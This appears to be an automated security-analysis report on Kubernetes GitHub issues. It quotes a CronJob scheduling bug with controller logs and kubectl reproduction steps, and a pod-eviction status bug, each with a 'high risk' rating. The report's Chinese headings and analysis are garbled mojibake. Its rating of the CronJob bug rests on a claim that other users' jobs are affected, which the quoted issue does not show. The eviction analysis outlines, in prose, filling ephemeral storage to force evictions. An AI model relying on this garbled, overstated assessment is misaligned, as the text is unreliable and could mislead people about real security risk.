# Issue å®‰å…¨åˆ†ææŠ¥å‘Š

# ğŸš¨ å­˜åœ¨é«˜é£é™©çš„ Issues (8 ä¸ª)

## Issue #128155 Unexpected Job Creation After CronJob Schedule Update

- Issue é“¾æ¥ï¼š[#128155](https://github.com/kubernetes/kubernetes/issues/128155)

### Issue å†…å®¹

#### What happened?

I have a CronJob running on an EKS cluster (1.28) with an initial schedule of `40 23 * * *`.
1. At `23:40 UTC`, a job was successfully completed, taking few seconds. 
2. At around `23:55 UTC`,  I changed the CronJob schedule to `50 23 * * *`. 
3. At `03:31:03 UTC`, an unexpected job was created.

I was able to reproduce the issue on another EKS cluster (1.28). Since I can't increase the verbosity level in EKS to gather more detailed logs from the controller manager, I decided to reproduce the issue on a local cluster created via Kind. I managed to reproduce the problem on both 1.28 and 1.31.

When testing on local cluster(1.28), I discovered a more interesting scenario. I had two CronJobs `cronjob-test-2` and `cronjob-test-3`
- cronjob-test-2: `49 9 * * *` -> `51 9 * * *`, with the change occurring shortly after `9:51 UTC`
- cronjob-test-3: `35 4 * * *` -> `38 4 * * *`, with the change occurring shortly after `4:38 UTC`

Surprisingly, both CronJobs created an unexpected job at the same time, `22:50:22 UTC`. Additionally, `cronjob-test-2` even missed an expected job
```
NAME                      COMPLETIONS   DURATION   AGE
cronjob-test-2-28816429   1/1           8s         38h    # a job was missed after this one
cronjob-test-2-28817871   1/1           6s         110m   # 22:50:22 UTC
cronjob-test-3-28817555   1/1           5s         20h
cronjob-test-3-28817558   1/1           4s         110m   # 22:50:22 UTC
``` 
<details>
  <summary>Cronjob Controller Logs</summary>
Following is the logs from cronjob_controllerv2 and job_controller, and the verbosity was set as 4.

```
I1015 09:45:19.354428       1 job_controller.go:226] "Starting job controller"
I1015 09:45:19.507521       1 cronjob_controllerv2.go:139] "Starting cronjob controller v2"
I1015 09:47:47.961434       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:47:47.961466       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="1m12.13858604s"
I1015 09:49:00.115477       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-2-28816429" cronjob="default/cronjob-test-2"
I1015 09:49:00.115531       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.115632       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-2-28816429" need=1 creating=1
I1015 09:49:00.119191       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m59.999440367s"
I1015 09:49:00.119243       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:00.119255       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m59.980770867s"
I1015 09:49:00.122067       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.123710       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.124323       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:00.124356       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="8.80725ms"
I1015 09:49:00.124368       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:00.124392       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m59.975645909s"
I1015 09:49:00.127551       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:01.122770       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="373.625Âµs"
I1015 09:49:06.780723       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:07.781300       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="113.042Âµs"
I1015 09:49:07.843924       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.784246       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.849759       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.849794       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.849808       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.250220655s"
I1015 09:49:08.852371       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.854308       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="9.805583ms"
I1015 09:49:08.854309       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28816429"
I1015 09:49:08.854353       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.856452       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.245670446s"
I1015 09:49:08.856481       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.858155       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.243529696s"
I1015 09:49:08.858215       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1015 09:49:08.858229       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="23h59m51.241795738s"
I1015 09:49:09.850763       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28816429" elapsed="88.25Âµs"
I1016 04:33:45.800541       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:33:45.800579       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="1m14.299487083s"
I1016 04:35:00.107918       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-3-28817555" cronjob="default/cronjob-test-3"
I1016 04:35:00.108011       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.108159       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-3-28817555" need=1 creating=1
I1016 04:35:00.109944       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.999111701s"
I1016 04:35:00.109981       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:00.109991       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.990031618s"
I1016 04:35:00.110014       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:00.110039       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.989994201s"
I1016 04:35:00.113206       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.115032       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.115046       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="7.007833ms"
I1016 04:35:00.115074       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:00.115103       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m59.984938868s"
I1016 04:35:00.115152       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:00.118528       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:01.115214       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="191.917Âµs"
I1016 04:35:03.142287       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:04.142862       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="230.125Âµs"
I1016 04:35:04.210513       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.149604       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.218654       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.218724       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.218770       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.881306115s"
I1016 04:35:05.221914       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.223483       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817555"
I1016 04:35:05.223533       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="11.988792ms"
I1016 04:35:05.223535       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.225526       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.876482823s"
I1016 04:35:05.225572       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.227006       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.874438157s"
I1016 04:35:05.227037       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 04:35:05.227051       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="23h59m54.87297224s"
I1016 04:35:06.220824       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817555" elapsed="90.458Âµs"
I1016 22:50:22.080092       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-3-28817558" cronjob="default/cronjob-test-3"
I1016 22:50:22.080204       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.080190       1 cronjob_controllerv2.go:633] "Created Job" job="default/cronjob-test-2-28817871" cronjob="default/cronjob-test-2"
I1016 22:50:22.080302       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.080310       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-3-28817558" need=1 creating=1
I1016 22:50:22.080342       1 job_controller.go:1545] "Too few pods running" key="default/cronjob-test-2-28817871" need=1 creating=1
I1016 22:50:22.082913       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m38.030291112s"
I1016 22:50:22.082947       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:22.082983       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m38.017065028s"
I1016 22:50:22.083007       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m38.030373028s"
I1016 22:50:22.083050       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:22.083069       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m38.016961653s"
I1016 22:50:22.086221       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.086290       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.087934       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.087979       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:22.088001       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m38.012036153s"
I1016 22:50:22.088076       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="7.858958ms"
I1016 22:50:22.088471       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.088499       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:22.088512       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m38.011512362s"
I1016 22:50:22.088654       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="8.343708ms"
I1016 22:50:22.088727       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:22.088770       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.092991       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:22.095171       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:23.087955       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="118.291Âµs"
I1016 22:50:23.087976       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="154.625Âµs"
I1016 22:50:24.887122       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:25.888042       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="201.375Âµs"
I1016 22:50:25.929334       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.891926       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.894910       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:26.932416       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.932463       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.932503       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.167550999s"
I1016 22:50:26.934834       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.936763       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-3-28817558"
I1016 22:50:26.936769       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="6.805541ms"
I1016 22:50:26.936798       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.938716       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.163216499s"
I1016 22:50:26.938804       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.940126       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.161207957s"
I1016 22:50:26.940153       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-3"
I1016 22:50:26.940166       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-3" requeueAfter="5h47m33.15985679s"
I1016 22:50:27.895393       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="355.792Âµs"
I1016 22:50:27.932640       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-3-28817558" elapsed="31.875Âµs"
I1016 22:50:27.958622       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.906520       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.963964       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.964008       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.964022       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.136008123s"
I1016 22:50:28.966974       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.968936       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="9.14725ms"
I1016 22:50:28.968962       1 job_controller.go:562] "enqueueing job" key="default/cronjob-test-2-28817871"
I1016 22:50:28.968997       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.972178       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.131016956s"
I1016 22:50:28.972209       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.973757       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.127801331s"
I1016 22:50:28.973821       1 cronjob_controllerv2.go:526] "No unmet start times" cronjob="default/cronjob-test-2"
I1016 22:50:28.973837       1 cronjob_controllerv2.go:219] "Re-queuing cronjob" cronjob="default/cronjob-test-2" requeueAfter="11h0m31.126191373s"
I1016 22:50:29.964871       1 job_controller.go:717] "Finished syncing job" key="default/cronjob-test-2-28817871" elapsed="122.875Âµs"
```
</details>

#### What did you expect to happen?

I expected the CronJobs to execute only according to the updated schedules and not trigger any additional or unscheduled jobs.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a CronJob with the schedule to run at time `A` every day. 
2. Allow the job to complete at time `A`.
2. At a later time `C`, update the schedule to `B`. `A < B < C`, `A` is the earliest time. 
3. Wait for several hours. Based on my tests, an unexpected job will be triggered, sometimes even more than 24 hours after `C`.  When this happens after 24 hours, the expected job that should be created at time `C` on the next day is replaced by the unexpected one.

```
kubectl create cronjob cronjob-test --image=busybox --schedule="A.minute A.hour * * *" -- date

# wait until job created at time A, run it at time C
kubectl patch cronjob cronjob-test -p '{"spec": {"schedule": "B.minute B.hour * * *"}}'
```

Unfortunately, I haven't been able to narrow down the creation time of the unexpected job, but this sequence reliably reproduces the issue.

#### Anything else we need to know?

Timezone: 
```
cat /etc/localtime
TZif2UTCTZif2UTC
UTC0
```

Based on my observation:
- **All the unexpected jobs were triggered at the exact same time**
For example, I had three CronJobs with different schedules. After rescheduling them to a later time, a few hours later, the controller manager created all three unexpected jobs simultaneously, even though neither the original nor the new schedules of these CronJobs were the same.
- **The issue only occurs when the reschedule creates an unmet job schedule.** For example, updating from `49 9 * * *` to `48 9 * * *` works fine, but doing the reverse (moving from an earlier to a later time) causes the problem.

This is similar to the issue mentioned [here](https://github.com/kubernetes/kubernetes/issues/123220#), though in my case, the unexpected jobs can be created either on the same day or the next day.

A big thanks to @soltysh  for helping me troubleshoot this issue.


#### Kubernetes version

<details>

I managed to reproduce the same issue across three Kubernetes clusters with the following versions

```
eks: v1.28.13-eks-a737599
kind: v1.28.12 and v1.31.0
```

</details>


#### Cloud provider

<details>
EKS and Kind on local macOS
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨æ›´æ–°CronJobçš„è®¡åˆ’æ—¶é—´åï¼Œå¯èƒ½ä¼šåœ¨é¢„æœŸä¹‹å¤–çš„æ—¶é—´åˆ›å»ºå¹¶è¿è¡ŒJobã€‚è€Œä¸”ï¼Œå½“å­˜åœ¨å¤šä¸ªCronJobæ—¶ï¼Œä¿®æ”¹ä¸€ä¸ªCronJobçš„è®¡åˆ’æ—¶é—´åï¼Œå…¶ä»–CronJobä¹Ÿå¯èƒ½ä¼šåœ¨åŒä¸€æ—¶é—´åˆ›å»ºæœªé¢„æœŸçš„Jobã€‚

åœ¨å¤šç”¨æˆ·åœºæ™¯ä¸‹ï¼Œå¦‚æœä¸€ä¸ªä½æƒé™ç”¨æˆ·ä¿®æ”¹äº†è‡ªå·±çš„CronJobè®¡åˆ’ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–ç”¨æˆ·çš„CronJobåœ¨éé¢„æœŸæ—¶é—´æ‰§è¡Œï¼Œä»è€Œå½±å“å…¶ä»–ç”¨æˆ·çš„ä»»åŠ¡è¿è¡Œã€‚è¿™ç¬¦åˆç¬¬9æ¡ï¼šå¦‚æœIssueå¯ä»¥å‘ç”Ÿåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸­ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“å’Œè‡ªå·±æƒé™ä¸€æ ·ç”šè‡³æ›´é«˜çš„å…¶ä»–ç”¨æˆ·ï¼Œå¦‚åœ¨è‡ªèº«å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤è€Œå½±å“åˆ°ä»–äººå®¹å™¨ï¼Œåˆ™åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜å¯èƒ½å¯¼è‡´ä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·çš„ä»»åŠ¡æ‰§è¡Œï¼Œå±äºé«˜å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "kubectl create cronjob cronjob-test-1 --image=busybox --schedule=\"40 9 * * *\" -- date",
    "explain": "åˆ›å»ºä¸€ä¸ªåä¸ºcronjob-test-1çš„CronJobï¼Œè®¡åˆ’åœ¨æ¯æ—¥9:40æ‰§è¡Œã€‚"
  },
  {
    "cmd": "kubectl create cronjob cronjob-test-2 --image=busybox --schedule=\"50 9 * * *\" -- date",
    "explain": "åˆ›å»ºå¦ä¸€ä¸ªåä¸ºcronjob-test-2çš„CronJobï¼Œè®¡åˆ’åœ¨æ¯æ—¥9:50æ‰§è¡Œã€‚"
  },
  {
    "cmd": "kubectl get jobs --watch",
    "explain": "å®æ—¶ç›‘æ§Jobçš„åˆ›å»ºå’Œæ‰§è¡ŒçŠ¶æ€ï¼Œç­‰å¾…CronJobåœ¨é¢„å®šæ—¶é—´è¿è¡Œå¹¶å®Œæˆã€‚"
  },
  {
    "cmd": "kubectl patch cronjob cronjob-test-1 -p '{\"spec\": {\"schedule\": \"55 9 * * *\"}}'",
    "explain": "åœ¨9:55ä¹‹å‰ï¼Œå°†cronjob-test-1çš„è®¡åˆ’ä¿®æ”¹ä¸ºæ¯æ—¥9:55æ‰§è¡Œã€‚"
  },
  {
    "cmd": "kubectl patch cronjob cronjob-test-2 -p '{\"spec\": {\"schedule\": \"5 10 * * *\"}}'",
    "explain": "å°†cronjob-test-2çš„è®¡åˆ’ä¿®æ”¹ä¸ºæ¯æ—¥10:05æ‰§è¡Œã€‚"
  },
  {
    "cmd": "kubectl get jobs --watch",
    "explain": "ç»§ç»­ç›‘æ§ï¼Œç­‰å¾…æ•°å°æ—¶ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰æ„å¤–çš„Jobè¢«åˆ›å»ºã€‚"
  },
  {
    "cmd": "kubectl get jobs",
    "explain": "æŸ¥çœ‹å½“å‰çš„Jobåˆ—è¡¨ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰æ„å¤–çš„Jobè¢«åˆ›å»ºã€‚"
  }
]
```

---

## Issue #128103 Pod status not getting updated to Failed when pod is hard-evicted by Kubelet

- Issue é“¾æ¥ï¼š[#128103](https://github.com/kubernetes/kubernetes/issues/128103)

### Issue å†…å®¹

#### What happened?

We have some pods that have a termination grace period of 3600sec. When such a pod gets evicted by the kubelet due to ephemeral storage shortage, the sequence of steps that we expect would happen is:

1. kubelet updates pod status to `Failed`
2. kubelet instructs container runtime to terminate containers without any grace period
3. a `DELETE` for that pod is issued to the apiserver

However, we don't see (1) happen. The pod status remains `Running` until step (3). This issue is further exacerbated by the fact that our version of kube is afflicted by #115819 wherein the termination grace-period of containers is respected, even though it isn't supposed to be.

As a result of this, what ends up happening is:
1. The pod's containers get `SIGTERM` (pod status remains `Running`)
2. Containers take 3600s to shutdown
3. Pod gets deleted from apiserver

This means there is a 1hr window where the pod is available as an 'endpoint' even though the containers have received SIGTERM (and are no longer accepting new connections) until the pod is deleted from the apiserver.

---

Events from the pod when it gets evicted:
```
 Warning  Evicted              3m24s                  kubelet               The node was low on resource: ephemeral-storage. Threshold quantity: 15405210648, available: 14857028Ki. Container appconfd was using 1224Ki, request is 0, has larger consumption of ephemeral-storage. Container istio-proxy was using 104Ki, request is 0, has larger consumption of ephemeral-storage. Container otel-agent was using 1200Ki, request is 0, has larger consumption of ephemeral-storage. Container vector-agent was using 16768Ki, request is 0, has larger consumption of ephemeral-storage. Container vault-refresh was using 1192Ki, request is 0, has larger consumption of ephemeral-storage. Container ses was using 3524Ki, request is 0, has larger consumption of ephemeral-storage. Container logrotate was using 1232Ki, request is 0, has larger consumption of ephemeral-storage. Container vaultpkid-refresh was using 1224Ki, request is 0, has larger consumption of ephemeral-storage.
  Warning  ExceededGracePeriod  3m14s (x9 over 9m18s)  kubelet               Container runtime did not kill the pod within specified grace period.
```

Pod's status is still 'Running':
```
$ k get pod ses-8576fbb5f-2z4jj -o json | jq .status.phase
"Running"
```

#### What did you expect to happen?

In case of a kubelet-initiated eviction, pod status should be updated to `Failed` before containers are terminated.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Configure and run a pod with terminationGracePeriod of 3600s
2. Exec into another pod on the node and write a lot of data to an `emptyDir` until the node runs out of ephemeral storage and evicts pod from step (1)
3. Observe that the status of the pod still displays 'Running' and the pod's IP address is still listed in endpoints.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"24", GitVersion:"v1.24.15", GitCommit:"2c67202dc0bb96a7a837cbfb8d72e1f34dfc2808", GitTreeState:"clean", BuildDate:"2023-06-14T09:56:11Z", GoVersion:"go1.19.10", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.4
Server Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.16-gke.1148000", GitCommit:"0bb6bb602fbe44baf68389e21f6e11859d08ee2d", GitTreeState:"clean", BuildDate:"2024-08-07T09:16:13Z", GoVersion:"go1.22.5 X:boringcrypto", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>
```
$ cat /etc/os-release
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
KERNEL_COMMIT_ID=2890fc8995cd68013377c0adcc1f6e985ee6e11e
GOOGLE_CRASH_ID=Lakitu
GOOGLE_METRICS_PRODUCT_ID=26
VERSION=105
VERSION_ID=105
BUILD_ID=17412.370.78
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Containerd v1.7.19
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
### åˆ†æ

è¯¥Issueæè¿°äº†åœ¨Kubernetesé›†ç¾¤ä¸­ï¼Œå½“Podç”±äºèŠ‚ç‚¹ä¸´æ—¶å­˜å‚¨(ephemeral storage)ä¸è¶³è€Œè¢«Kubeletå¼ºåˆ¶é©±é€æ—¶ï¼ŒPodçš„çŠ¶æ€ä¸ä¼šç«‹å³æ›´æ–°ä¸º`Failed`ï¼Œå¹¶ä¸”ç”±äºå­˜åœ¨å·²çŸ¥é—®é¢˜(#115819)ï¼Œå®¹å™¨ä¼šéµå¾ªè¿‡é•¿çš„ç»ˆæ­¢å®½é™æœŸ(terminationGracePeriodSeconds)ï¼Œå¯¼è‡´å®¹å™¨åœ¨æ”¶åˆ°`SIGTERM`ä¿¡å·åï¼Œä»éœ€ç­‰å¾…é•¿è¾¾3600ç§’æ‰ä¼šçœŸæ­£ç»ˆæ­¢ã€‚åœ¨æ­¤æœŸé—´ï¼ŒPodçš„çŠ¶æ€ä»æ˜¾ç¤ºä¸º`Running`ï¼Œå¹¶ç»§ç»­ä½œä¸ºæœåŠ¡çš„ç«¯ç‚¹ã€‚

è¿™ä¸€è¡Œä¸ºå¯èƒ½å¯¼è‡´ä»¥ä¸‹å®‰å…¨é£é™©ï¼š

1. **æ‹’ç»æœåŠ¡(DoS)æ”»å‡»**ï¼šæ”»å‡»è€…å¯ä»¥åœ¨å…¶æœ‰æƒé™çš„Podä¸­æ¶ˆè€—å¤§é‡çš„ä¸´æ—¶å­˜å‚¨ï¼Œå¯¼è‡´æ‰€åœ¨èŠ‚ç‚¹çš„ä¸´æ—¶å­˜å‚¨è€—å°½ï¼Œä»è€Œè§¦å‘Kubeleté©±é€å…¶ä»–ç”¨æˆ·çš„Podã€‚è¿™äº›è¢«é©±é€çš„Podç”±äºä¸Šè¿°é—®é¢˜ï¼Œä¼šåœ¨é•¿æ—¶é—´å†…ä¿æŒ`Running`çŠ¶æ€ï¼Œä½†å®é™…ä¸Šæ— æ³•æä¾›æ­£å¸¸æœåŠ¡ï¼Œå¯¼è‡´è¯·æ±‚æ— æ³•å¾—åˆ°å¤„ç†ï¼Œå½±å“æœåŠ¡å¯ç”¨æ€§ã€‚

